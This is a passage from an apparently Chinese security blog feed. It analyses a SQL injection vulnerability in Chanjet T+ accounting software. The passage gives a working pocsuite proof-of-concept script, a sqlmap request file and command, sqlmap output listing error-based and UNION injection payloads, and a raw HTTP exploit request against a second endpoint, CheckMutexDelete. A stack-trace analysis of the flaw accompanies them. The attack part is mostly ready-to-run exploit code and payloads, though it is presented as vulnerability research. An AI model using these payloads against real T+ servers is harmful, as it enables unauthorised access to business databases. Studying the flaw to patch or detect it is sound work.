class="line">    vulID = <span class="string">&#x27;0&#x27;</span>  <span class="comment"># ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span></span><br><span class="line">    version = <span class="string">&#x27;1&#x27;</span>  <span class="comment"># 默认为1</span></span><br><span class="line">    author = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># PoC作者的大名</span></span><br><span class="line">    vulDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># 漏洞公开的时间,不知道就写今天</span></span><br><span class="line">    createDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># 编写 PoC 的日期</span></span><br><span class="line">    updateDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># PoC 更新的时间,默认和编写时间一样</span></span><br><span class="line">    references = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># 漏洞地址来源,0day不用写</span></span><br><span class="line">    name = <span class="string">&#x27;畅捷通T+ SQL上传&#x27;</span>  <span class="comment"># PoC 名称</span></span><br><span class="line">    appPowerLink = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 漏洞厂商主页地址</span></span><br><span class="line">    appName = <span class="string">&#x27;畅捷通T+&#x27;</span>  <span class="comment"># 漏洞应用名称</span></span><br><span class="line">    appVersion = <span class="string">&#x27;&#x27;&#x27;13.0 &lt;= 畅捷通T+单机版&lt;=16.0且使用IIS10.0以下版本&#x27;&#x27;&#x27;</span>  <span class="comment"># 漏洞影响版本</span></span><br><span class="line">    vulType = VUL_TYPE.UPLOAD_FILES  <span class="comment"># 漏洞类型,类型参考见 漏洞类型规范表</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        CNVD-2022-60632 畅捷通T+ SQL漏洞</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 漏洞简要描述</span></span><br><span class="line">    samples = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># 测试样列,就是用 PoC 测试成功的网站</span></span><br><span class="line">    install_requires = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span></span><br><span class="line">    pocDesc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    category = POC_CATEGORY.EXPLOITS.REMOTE</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.url.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">            path = <span class="string">&quot;tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path = <span class="string">&quot;/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex&quot;</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.url.startswith(<span class="string">&#x27;http://&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;https://&#x27;</span>):</span><br><span class="line">            url = <span class="string">&#x27;http://&#x27;</span> + self.url</span><br><span class="line">        url = self.url + path</span><br><span class="line">        headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">        data = <span class="string">&#x27;&#x27;&#x27;&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span></span><br><span class="line"><span class="string">        # data = &#x27;&#x27;&#x27;</span>&#123;<span class="string">&quot;accNum&quot;</span>: <span class="string">&quot;3&#x27; AND (select )-- NCab&quot;</span>, <span class="string">&quot;functionTag&quot;</span>: <span class="string">&quot;SYS0104&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        print(f&quot;数据: &#123;data&#125;&quot;)</span></span><br><span class="line"><span class="string">        print(f&quot;扫描目标: &#123;url&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span></span><br><span class="line"><span class="string">            repData =requests.post(url, headers=headers, data=data, timeout=1000, verify=False)</span></span><br><span class="line"><span class="string">            print(f&quot;响应: &#123;repData.text&#125;&quot;)</span></span><br><span class="line"><span class="string">            if &quot;Microsoft SQL Server&quot; in repData.text and &quot;error&quot; not in repData.text:</span></span><br><span class="line"><span class="string">            #if repData.status_code == 200:</span></span><br><span class="line"><span class="string">                result[&#x27;VerifyInfo&#x27;] = &#123;&#125;</span></span><br><span class="line"><span class="string">                result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = url </span></span><br><span class="line"><span class="string">                result[&#x27;VerifyInfo&#x27;][&#x27;message&#x27;] = repData.text</span></span><br><span class="line"><span class="string">                result[&#x27;VerifyInfo&#x27;][&#x27;shell&#x27;] = self.url + &#x27;/tplus/UFAQD/InitServerInfo.aspx?preload=1&#x27;                </span></span><br><span class="line"><span class="string">        except Exception as e:</span></span><br><span class="line"><span class="string">            print(e)</span></span><br><span class="line"><span class="string">            return</span></span><br><span class="line"><span class="string">        return self.parse_output(result)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def _attack(self):</span></span><br><span class="line"><span class="string">        return self._verify()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def parse_attack(self, result):</span></span><br><span class="line"><span class="string">        output = Output(self)</span></span><br><span class="line"><span class="string">        if result:</span></span><br><span class="line"><span class="string">            output.success(result)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            output.fail(&#x27;target is not vulnerable&#x27;)</span></span><br><span class="line"><span class="string">        return output</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def _shell(self):</span></span><br><span class="line"><span class="string">        return</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def parse_output(self, result):</span></span><br><span class="line"><span class="string">        output = Output(self)</span></span><br><span class="line"><span class="string">        if result:</span></span><br><span class="line"><span class="string">            output.success(result)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            output.fail(&#x27;target is not vulnerable&#x27;)</span></span><br><span class="line"><span class="string">        return output</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">register_poc(ChanJetPOC)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>使用 pocsuit 执行上述 poc 结果如下所示：</p><style>.ywbnivpnuwhe{zoom:80%;}</style><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/image-20240407082635186.png" class="ywbnivpnuwhe" alt="POC 执行结果"><p>可以看到执行的 POC 为 <code>&#123;&quot;accNum&quot;: &quot;3&#39;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</code> ，查询语句为 <code>select @@version</code> ，并且查询返回了 SQL Server 的版本为 <code>Microsoft SQL Server 2022 (RTM)……</code>。</p><h3 id="使用-SqlMap-检测"><a href="#使用-SqlMap-检测" class="headerlink" title="使用 SqlMap 检测"></a>使用 SqlMap 检测</h3><p>根据上述 POC 编写 sqlmap 的检测文件。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># sql.txt</span><br><span class="line">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/css,*/*;q=0.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&#123;&quot;accNum&quot;: &quot;3&#x27;&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br></pre></td></tr></table></figure><p>使用 sqlmap 执行上述检测文件，如果为 sqlmap 不熟悉，可以参考这篇文章：<a href="https://blog.csdn.net/weixin_43819747/article/details/136736688">【SQL注入】Sqlmap使用指南(手把手保姆版)持续更新_web union sql 注入 测试工具-CSDN博客</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r sql.txt --random-agent -v <span class="number">3</span> --dbms mssql --hex -p &quot;accNum&quot; --batch</span><br></pre></td></tr></table></figure><p>这里对上述执行命令稍加说明：</p><p><code>-r</code>: 指定从文件中加载 http 请求</p><p><code>--random-agent</code>：使用随机选择的HTTP User-Agent头部值</p><p><code>-v</code>: 详细级别: 0-6（默认为1）</p><p><code>--dbms</code>: 指定是数据库名</p><p><code>--hex</code>: 在数据检索过程中使用十六进制转换</p><p><code>-p</code>: 可测试的参数</p><p><code>--batch</code>: 不要询问用户输入,使用默认行为</p><p>运行完上述命令之后就会生成 sql 漏洞相关注入点，以畅捷通 SQL 漏洞为例，输出如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: JSON accNum ((custom) POST)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)</span><br><span class="line">    Payload: &#123;&quot;accNum&quot;: &quot;3&#x27; AND 3159 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (3159=3159) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113)))-- zxmb&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br><span class="line">    Vector: AND [RANDNUM] IN (SELECT (&#x27;[DELIMITER_START]&#x27;+([QUERY])+&#x27;[DELIMITER_STOP]&#x27;))</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 22 columns</span><br><span class="line">    Payload: &#123;&quot;accNum&quot;: &quot;3&#x27; UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(72)+CHAR(103)+CHAR(87)+CHAR(72)+CHAR(115)+CHAR(109)+CHAR(84)+CHAR(82)+CHAR(117)+CHAR(65)+CHAR(80)+CHAR(105)+CHAR(112)+CHAR(84)+CHAR(81)+CHAR(66)+CHAR(116)+CHAR(120)+CHAR(73)+CHAR(103)+CHAR(106)+CHAR(79)+CHAR(71)+CHAR(102)+CHAR(80)+CHAR(110)+CHAR(104)+CHAR(75)+CHAR(113)+CHAR(116)+CHAR(82)+CHAR(114)+CHAR(112)+CHAR(117)+CHAR(82)+CHAR(104)+CHAR(89)+CHAR(105)+CHAR(114)+CHAR(73)+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nhDS&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br><span class="line">    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]</span><br><span class="line">---</span><br><span class="line">web server operating system: Windows</span><br><span class="line">web application technology: Nginx 1.16.1, ASP.NET, ASP.NET 4.0.30319</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2022</span><br></pre></td></tr></table></figure><p>以下是【文心一言】对上述结果的解读：</p><blockquote><p>SQLMap 的输出显示了它已识别到的 SQL 注入点，并提供了详细的注入类型和对应的 payload。这是它自动检测到的潜在安全漏洞。</p><p>以下是关于输出的一些解释：</p><ol><li>注入点信息<ul><li><strong>参数</strong>：<code>JSON accNum</code> 是一个 JSON 格式的 POST 请求参数，它是 SQL 注入的入口点。</li><li>类型<ul><li><strong>error-based</strong>：基于错误的注入类型，它利用数据库错误消息来推断 SQL 查询的结构。</li><li><strong>UNION query</strong>：UNION 查询注入类型，它利用 SQL 的 UNION 语句来合并多个查询结果。</li></ul></li></ul></li><li>Payload<ul><li>Payload 是 SQLMap 构造的恶意输入，用于触发 SQL 注入并提取信息。例如，<code>3&#39; AND 3159 IN (SELECT ...</code> 就是一个用于触发基于错误的注入的 payload。</li></ul></li><li>Vector<ul><li>Vector 是 SQLMap 使用的注入模板，用于构造具体的 payload。</li></ul></li><li>Web 服务器操作系统和技术<ul><li>SQLMap 还识别了目标服务器的操作系统（Windows）以及使用的 web 技术（Nginx 1.16.1, ASP.NET, ASP.NET 4.0.30319）。</li></ul></li><li>后端数据库管理系统<ul><li>识别出的后端数据库是 Microsoft SQL Server 2022。</li></ul></li></ol><p>根据这些信息，您可以进一步分析目标系统的安全性，并考虑采取适当的措施来修复这些 SQL 注入漏洞。这可能包括更新或修补应用程序代码、使用参数化查询或预编译的语句来防止 SQL 注入，以及限制对数据库的访问权限等。</p><p>请注意，在实际环境中，一旦发现了 SQL 注入漏洞，您应该立即通知相关的系统管理员或安全团队，并避免未经授权地访问或利用这些漏洞。</p></blockquote><h2 id="堆栈分析"><a href="#堆栈分析" class="headerlink" title="堆栈分析"></a>堆栈分析</h2><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Ufida.T.SM.UIP.dll!Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(<span class="built_in">string</span> url, <span class="built_in">string</span> accNum, <span class="built_in">string</span> functionTag) (IL=prolog, Native=<span class="number">0x00007FF8F4474D30</span>+<span class="number">0x0</span>)</span><br><span class="line"> [本机到托管的转换]</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(<span class="built_in">object</span> obj, <span class="built_in">object</span>[] parameters, <span class="built_in">object</span>[] arguments) (IL≈<span class="number">0x0016</span>, Native=<span class="number">0x00007FF94CA3F9A0</span>+<span class="number">0x84</span>)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(<span class="built_in">object</span> obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, <span class="built_in">object</span>[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=<span class="number">0x00007FF94CA57300</span>+<span class="number">0x92</span>)</span><br><span class="line"> mscorlib.dll!System.Reflection.MethodBase.Invoke(<span class="built_in">object</span> obj, <span class="built_in">object</span>[] parameters) (IL=epilog, Native=<span class="number">0x00007FF94CAD6AE0</span>+<span class="number">0x22</span>)</span><br><span class="line"> AjaxPro<span class="number">.2</span>.dll!AjaxPro.AjaxProcHelper.Run() (IL≈<span class="number">0x066C</span>, Native=<span class="number">0x00007FF8F44599A0</span>+<span class="number">0xAD3</span>)</span><br><span class="line"> AjaxPro<span class="number">.2</span>.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context) (IL=<span class="number">0x0010</span>, Native=<span class="number">0x00007FF8F4459900</span>+<span class="number">0x3A</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() (IL≈<span class="number">0x018D</span>, Native=<span class="number">0x00007FF93CA37CD0</span>+<span class="number">0x21E</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ExecuteStepImpl(System.Web.HttpApplication.IExecutionStep step) (IL=epilog, Native=<span class="number">0x00007FF93C9FADA0</span>+<span class="number">0x4B</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ExecuteStep(System.Web.HttpApplication.IExecutionStep step, <span class="keyword">ref</span> <span class="built_in">bool</span> completedSynchronously) (IL≈<span class="number">0x0015</span>, Native=<span class="number">0x00007FF93C9FAE00</span>+<span class="number">0x5D</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.PipelineStepManager.ResumeSteps(System.Exception error) (IL≈<span class="number">0x027A</span>, Native=<span class="number">0x00007FF93CA0E650</span>+<span class="number">0x5CF</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.BeginProcessRequestNotification(System.Web.HttpContext context, System.AsyncCallback cb) (IL=<span class="number">0x0031</span>, Native=<span class="number">0x00007FF93C9F9AB0</span>+<span class="number">0x7D</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpRuntime.ProcessRequestNotificationPrivate(System.Web.Hosting.IIS7WorkerRequest wr, System.Web.HttpContext context) (IL≈<span class="number">0x00B0</span>, Native=<span class="number">0x00007FF93CA0CCA0</span>+<span class="number">0xE0</span>)</span><br><span class="line"> System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotificationHelper(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, <span class="built_in">int</span> flags) (IL≈<span class="number">0x0131</span>, Native=<span class="number">0x00007FF93C9FBE90</span>+<span class="number">0x4DC</span>)</span><br><span class="line"> System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotification(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, <span class="built_in">int</span> flags) (IL≈<span class="number">0x0000</span>, Native=<span class="number">0x00007FF93C9FBE50</span>+<span class="number">0x14</span>)</span><br><span class="line"> [托管到本机的转换]</span><br><span class="line"> System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotificationHelper(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, <span class="built_in">int</span> flags) (IL≈<span class="number">0x01E7</span>, Native=<span class="number">0x00007FF93C9FBE90</span>+<span class="number">0x607</span>)</span><br><span class="line"> System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotification(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, <span class="built_in">int</span> flags) (IL≈<span class="number">0x0000</span>, Native=<span class="number">0x00007FF93C9FBE50</span>+<span class="number">0x14</span>)</span><br><span class="line"> [程序域转换]</span><br></pre></td></tr></table></figure><p>主要看方法 <code>Ufida.T.SM.UIP.dll!Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(string url, string accNum, string functionTag) </code></p><p>入参如下所示：</p><p>其中 <code>CheckMutex</code> 的属性为 <code>AjaxMethod</code> ，然后我们根据入参提供对应的参数即可。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/image-20240418164228754.png" class="" title="CheckMutex"><p>可以看到需要满足 <code>functionTag</code> 为 <code>SYS0104</code>，才能执行 <code>CheckUserFunction</code> 函数，而 <code>CheckUserFunction</code> 执行的就是 <code>accNum</code> 的值。</p><p>然后在执行畅捷通接口 <code>Ufida.T.EAP.Mutex.Interface.IMutex.CheckUserFunction</code> 时报了异常，但是仍然执行了 SQL 。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/image-20240418165341199.png" class="" title="image-20240418165341199"><p>在异常信息中可以看到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exception.SqlString <span class="operator">=</span> &quot;select id,UseLogID,Acaa_Num,UserID,UserName,PersonName,Url,HostAddress,HostName,FunctionTag,FunctionName,BeginTime,State,Version,Description,TaskID,ModelClassType,ModelType,ClientType,ServerAddress from EAP_Mutex with(nolock) where userid &lt;&gt;  N&#x27;&#x27; and Acaa_Num =  N&#x27;3&#x27;and (select @@version)&gt;0-- N&#x27; and  Version = &#x27;YWTPro N&#x27; order by begintime&quot;</span><br></pre></td></tr></table></figure><p>可以看下注入前与注入后的SQL语句对比：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span>   </span><br><span class="line">    id,  </span><br><span class="line">    UseLogID,  </span><br><span class="line">    Acaa_Num,  </span><br><span class="line">    UserID,  </span><br><span class="line">    UserName,  </span><br><span class="line">    PersonName,  </span><br><span class="line">    Url,  </span><br><span class="line">    HostAddress,  </span><br><span class="line">    HostName,  </span><br><span class="line">    FunctionTag,  </span><br><span class="line">    FunctionName,  </span><br><span class="line">    BeginTime,  </span><br><span class="line">    State,  </span><br><span class="line">    Version,  </span><br><span class="line">    Description,  </span><br><span class="line">    TaskID,  </span><br><span class="line">    ModelClassType,  </span><br><span class="line">    ModelType,  </span><br><span class="line">    ClientType,  </span><br><span class="line">    ServerAddress</span><br><span class="line"><span class="keyword">from</span> EAP_Mutex</span><br><span class="line"><span class="keyword">with</span>(nolock)</span><br><span class="line"># 上边代码一致</span><br><span class="line"># 注入前</span><br><span class="line"><span class="keyword">where</span>   </span><br><span class="line">    userid <span class="operator">&lt;&gt;</span> N<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span>   </span><br><span class="line">    Acaa_Num <span class="operator">=</span> N<span class="string">&#x27;3N&#x27;</span> <span class="keyword">and</span>   </span><br><span class="line">    Version <span class="operator">=</span> <span class="string">&#x27;YWTPro N&#x27;</span></span><br><span class="line"># 注入后</span><br><span class="line"><span class="keyword">where</span>   </span><br><span class="line">    userid <span class="operator">&lt;&gt;</span> N<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span>   </span><br><span class="line">    Acaa_Num <span class="operator">=</span> N<span class="string">&#x27;3&#x27;</span> <span class="keyword">and</span> </span><br><span class="line">    (<span class="keyword">select</span> @<span class="variable">@version</span>)<span class="operator">&gt;</span><span class="number">0</span><span class="comment">-- N&#x27; and </span></span><br><span class="line">    Version <span class="operator">=</span> <span class="string">&#x27;YWTPro N&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在执行时因为报错，返回了异常信息，也就返回了我们要执行的查询结果，异常捕捉的堆栈如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在 Ufida.T.EAP.Aop.Dynamic.LocalCallDynamicProxyImpl.NormalInvoke(MethodBase method, Object[] args, Boolean needFreeCuid)\r\n   </span><br><span class="line">在 Ufida.T.EAP.Aop.Dynamic.LocalCallDynamicProxyImpl.Invoke(IMessage message)\r\n   </span><br><span class="line">在 System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(MessageData&amp; msgData, Int32 type)\r\n   </span><br><span class="line">在 Ufida.T.EAP.Mutex.Interface.IMutex.CheckUserFunction(String accountNum)\r\n   </span><br><span class="line">在 Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(String url, String accNum, String functionTag)</span><br></pre></td></tr></table></figure><p>使用 dnSpy 反编译之后可以看到，<strong>CheckMutexDelete</strong> 方法也可以用于该漏洞，需要在 请求体添加 <code>dsName</code> 参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutexDelete HTTP/1.1</span><br><span class="line">Host: 192.168.19.137:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/css,*/*;q=0.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;, &quot;dsName&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：畅捷通T+ SQL 注入漏洞(含POC)&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="畅捷通" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"/>
    
    
  </entry>
  
  <entry>
    <title>【POC】pocsuite 用法</title>
    <link href="http://example.com/B_Code/Python/%E3%80%90POC%E3%80%91pocsuite%20%E7%94%A8%E6%B3%95/"/>
    <id>http://example.com/B_Code/Python/%E3%80%90POC%E3%80%91pocsuite%20%E7%94%A8%E6%B3%95/</id>
    <published>2024-04-01T08:26:20.115Z</published>
    <updated>2024-04-01T08:27:50.607Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：pocsuite 工具的用法整理</p><p>参考链接：</p><ul><li><a href="https://www.freebuf.com/column/162868.html">工具| PocSuite 使用介绍 - FreeBuf网络安全行业门户</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：pocsuite 工具的用法整理&lt;/p&gt;
&lt;p&gt;参考链接：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/column/162868.html&quot;&gt;工具| PocSuite 使用介绍 - FreeB</summary>
      
    
    
    
    <category term="B_Code" scheme="http://example.com/categories/B-Code/"/>
    
    <category term="Python" scheme="http://example.com/categories/B-Code/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>【.Net】可执行文件结构分析（翻译）</title>
